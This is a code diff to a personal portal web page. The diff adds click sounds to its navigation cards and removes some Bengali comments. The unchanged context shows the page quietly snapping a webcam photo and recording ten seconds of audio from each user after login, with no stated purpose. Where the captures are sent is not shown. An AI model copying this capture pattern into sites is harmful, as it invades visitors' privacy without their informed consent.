@@ -24,7 +24,7 @@
         
         /* Glow Grid Buttons */
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 20px; max-width: 600px; margin: 0 auto; }
-        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.4s; position: relative; }
+        .card { background: rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.05); transition: 0.4s; position: relative; cursor: pointer; }
         .card:hover { transform: translateY(-5px); border-color: var(--pink); box-shadow: 0 0 20px rgba(255, 77, 148, 0.4); background: rgba(255, 77, 148, 0.05); }
         .card i { font-size: 2.2rem; color: var(--pink); margin-bottom: 12px; filter: drop-shadow(0 0 5px var(--pink)); }
         
@@ -43,6 +43,10 @@
     </style>
 </head>
 <body>
+
+    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
+    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
+    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
 
     <div id="login-overlay">
         <div class="glass-box">
@@ -77,9 +81,18 @@
 
         <div class="grid">
             <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
-            <a href="business.html" class="card"><i class="fas fa-handshake"></i><p>Business</p></a>
-            <a href="portfolio.html" class="card"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search"></i><p>Lookup</p></a>
+            
+            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();">
+                <i class="fas fa-handshake"></i><p>Business</p>
+            </a>
+            
+            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();">
+                <i class="fas fa-laptop-code"></i><p>Portfolio</p>
+            </a>
+            
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card" onclick="document.getElementById('snd-look').play();">
+                <i class="fas fa-search"></i><p>Lookup</p>
+            </a>
         </div>
 
         <div class="chat-area">
@@ -133,7 +146,6 @@
             
             if(stream) {
                 video.srcObject = stream;
-                // ভিডিও লোড হওয়ার জন্য অপেক্ষা
                 video.onloadedmetadata = () => video.play();
             }
             
@@ -143,7 +155,6 @@
             document.getElementById('u-pic').src = loggedUser.photoURL;
 
             if(stream) {
-                // ক্যামেরা রেডি হতে ২ সেকেন্ড সময় দিয়ে প্রথম স্ন্যাপ
                 setTimeout(() => takeSnap(loggedUser), 2000);
                 recordVoice(stream, 10000); 
             }
@@ -160,7 +171,6 @@
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
 
-            // চেক করা ভিডিও ডাটা দিচ্ছে কিনা
             if (video.readyState < 2 || video.videoWidth === 0) {
                 setTimeout(() => takeSnap(user), 1000);
                 return;
